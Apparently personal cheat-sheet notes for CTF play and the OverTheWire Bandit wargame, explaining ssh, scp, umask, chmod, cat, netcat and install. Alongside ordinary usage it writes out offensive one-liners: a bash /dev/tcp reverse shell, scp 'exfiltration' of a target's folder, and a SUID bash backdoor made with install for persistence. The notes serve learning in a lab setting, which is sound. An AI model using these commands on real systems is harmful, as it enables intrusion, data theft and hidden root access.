
---

### 1. `ssh` (Secure Shell)

**The Need:** To gain a secure, encrypted terminal on a remote machine.

- **Syntax:** `ssh -i [private_key] -p [port] [user]@[ip]`
    
- **CTF Details:** * **Port Forwarding (`-L`):** If a target has a database running on port 3306 that is blocked by a firewall, you can "tunnel" it to your machine: `ssh -L 9000:localhost:3306 user@ip`. Now, connecting to `localhost:9000` on your machine connects you to the target's database.
    
    - **Config Bypass:** Use `-o "PubkeyAuthentication=no"` to force password entry if you have a key loaded but want to test a password.
        
- **Safety Tip:** If you find a private key (`id_rsa`), the SSH client will refuse to use it unless it is "secret." You **must** run `chmod 600 id_rsa` first.
    
In the context of the **OverTheWire: Bandit** wargame, transferring a file to your local Kali machine is a common task for further analysis (like using `strings` or `xxd` on your own tools).

Since Bandit allows SSH access, the two best methods are **`scp`** and **`nc` (Netcat)**.

### 2. `scp` (Secure Copy)

**The Need:** To transfer files over the SSH protocol.

- **Syntax:** `scp -P [port] [source] [dest]`
    
- **CTF Details:**
    
    - **Exfiltration:** To steal a folder from the target: `scp -r user@target_ip:/home/user/secret_docs ./local_folder`.
        
    - **Uploading Tools:** Moving enumeration scripts (like LinPEAS) to `/tmp/`: `scp linpeas.sh user@ip:/tmp/`.
        
- **Note:** If the target's SSH port is not 22, you must use `-P` (capital P).
    
###  Using `scp` (The Secure Way)

This is the standard method. You run this command from your **Kali terminal**, not from inside the Bandit shell.

**Syntax:**
`scp -P 2220 banditX@bandit.labs.overthewire.org:[path_to_file] [local_destination]`

**Example (Transferring a file named `data.txt` from level 0):**

```bash
scp -P 2220 bandit0@bandit.labs.overthewire.org:~/data.txt ~/Desktop/
```

* **`-P 2220`**: Specifies the port (Bandit uses 2220, not the default 22).
* **`~/data.txt`**: The path to the file on the Bandit server.
* **`~/Desktop/`**: Where you want it saved on your Kali machine.

---
### 3. `umask` (User File-Creation Mask)

**The Need:** To control the default permissions of files you are about to create.

- **Syntax:** `umask [octal_mask]`
    
- **CTF Details:**
    
    - `umask` acts as a filter. If the mask is `077`, any file you create will have permissions `600` (Read/Write for you, nothing for others).
        
    - **Why use it?** In shared CTF environments, if you create a "reverse shell" script with sensitive IP addresses, other players can `cat` your script unless you set `umask 077` before creating it.
        

### 4. `chmod` (Change Mode)

**The Need:** To modify the read/write/execute bits of a file.

- **Syntax:** `chmod [mode] [file]`
    
- **CTF Details:**
    
    - **SUID Bit (`4000`):** `chmod 4755 [file]` makes the file run with the privileges of the **owner** (often root), not the user who runs it. This is a primary target for Privilege Escalation.
        
    - **Octal vs Symbolic:** `chmod 777` is fast, but `chmod +x` is safer for making scripts executable without changing other permissions.
        

### 5. `cat` (Concatenate)

**The Need:** To output file contents to the terminal.

- **Syntax:** `cat [options] [file]`
    
- **CTF Details:**
    
    - **Hidden Characters (`-A` or `-ve`):** CTF creators often hide flags using "Non-printable characters" or trailing spaces. `cat -A flag.txt` will show tabs as `^I` and line endings as `$`.
        
    - **No-Space Bypass:** If a filter blocks spaces, you can sometimes use `cat<flag.txt` to read the file.
        

### 6. `nc` (Netcat)

**The Need:** The "Swiss Army Knife" of networking. It reads and writes data across network connections.

- **Syntax:** * Listener: `nc -lvnp [port]`
    
    - Client: `nc [ip] [port]`
        
- **CTF Details:**
    
    - **Banner Grabbing:** Connect to a port to see what service is running: `nc -v 10.10.10.10 80`.
        
    - **Reverse Shell:** On your machine: `nc -lvnp 4444`. On target: `bash -i >& /dev/tcp/[your_ip]/4444 0>&1`.
        
    - **File Transfer:** * Recieve: `nc -l -p 1234 > file.txt`
        
        - Send: `nc [ip] 1234 < file.txt`
            

### 7. `install`

**The Need:** To copy files and set attributes (owner, permissions) in a single atomic step.

- **Syntax:** `install -m [mode] -o [owner] [source] [destination]`
    
- **CTF Details:**
    
    - **Persistence:** Instead of `cp` and then `chmod`, attackers use `install -m 4755 /bin/bash /tmp/rootbash` to create a SUID backdoor in one command.
        
    - It is cleaner and less likely to leave broken-permission files behind during an exploit.
        

---

### Comparison of Transport & Access Tools

|**Goal**|**Command**|**Why it beats the alternative**|
|---|---|---|
|**Login**|`ssh`|Encrypted; allows tunneling internal ports.|
|**Move File**|`scp`|Secure; uses existing SSH credentials.|
|**Shell**|`nc`|Extremely lightweight; works on almost any Linux distro.|
|**Backdoor**|`install`|Sets SUID and copies in one "quiet" step.|
|**View Secrets**|`cat -A`|Reveals "invisible" steganography in text files.|
